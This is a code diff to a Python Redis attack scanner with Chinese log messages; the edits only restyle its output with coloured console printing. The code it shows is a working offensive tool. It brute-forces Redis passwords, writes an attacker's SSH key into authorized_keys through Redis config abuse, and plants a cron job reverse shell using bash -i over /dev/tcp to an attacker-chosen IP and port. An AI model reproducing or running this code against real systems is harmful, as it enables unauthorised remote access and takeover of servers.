@@ -13,6 +13,7 @@ from redis import Redis
 
 from tools.SchedulerTools import run_batch
 from tools.WordlistTools import load_lines
+from tools.color import console
 
 redis_found_hosts = set()
 redis_found_lock = threading.Lock()
@@ -36,19 +37,19 @@ def scan_redis(host="127.0.0.1", port=6379, password="", ssh_pub_key=None, ip=No
         if redis_cli.ping():
             with redis_found_lock:
                 redis_found_hosts.add(key)
+            console.print(f"    [success]✔ Redis {host}:{port} → {password}[/success]")
             redis_info = redis_cli.info()
-            print("===================================================================")
-            print(f"[+] {host} Redis连接成功,存在弱口令:{password}")
-            print("===================================================================")
-            if "Linux" not in redis_info["os"] or redis_info["redis_mode"] != "standalone" or redis_cli.config_get("protected-mode")["protected-mode"] != "no":
-                print(f"[!] {host}:{port} 不满足Redis写入利用条件 ")
+            if ("Linux" not in redis_info.get("os", "") or
+                    redis_info.get("redis_mode") != "standalone" or
+                    redis_cli.config_get("protected-mode").get("protected-mode") != "no"):
+                console.print(f"    [fail]✗ 不满足 Redis 写入利用条件[/fail]")
                 redis_cli.close()
                 return
             if ssh_pub_key:
-                print("[+] 尝试公私钥注入")
+                console.print("    [info]→ 尝试公私钥注入[/info]")
                 unauthorized_publicKey(redis_cli, ssh_pub_key)
             if ip:
-                print("[+] 尝试定时任务反弹")
+                console.print("    [info]→ 尝试定时任务反弹[/info]")
                 unauthorized_reverseShell(redis_cli, ip, listen_port)
         redis_cli.close()
     except:
@@ -61,7 +62,7 @@ def unauthorized_publicKey(redis_cli, ssh_pub_key):
     redis_cli.config_set("dbfilename", "authorized_keys")
     redis_cli.set("kfc", "\n\n\n\n" + ssh_pub_key + "\n\n\n\n")
     if ssh_pub_key in redis_cli.get("kfc").decode("utf-8") and redis_cli.save():
-        print("[*] Redis未授权公私钥写入成功")
+        console.print("    [success]✔ 公私钥写入成功[/success]")
         redis_cli.close()
 
 
@@ -72,7 +73,7 @@ def unauthorized_reverseShell(redis_cli, ip, listen_port):
     reverseCommand = f"*/1 * * * * bash -i >& /dev/tcp/{ip}/{listen_port} 0>&1"
     redis_cli.set("vw50", "\n\n\n\n" + reverseCommand + "\n\n\n\n")
     if reverseCommand in redis_cli.get("vw50").decode("utf-8") and redis_cli.save():
-        print("[*] Redis未授权定时任务反弹成功")
+        console.print("    [success]✔ 定时任务反弹成功[/success]")
         redis_cli.close()
 
 
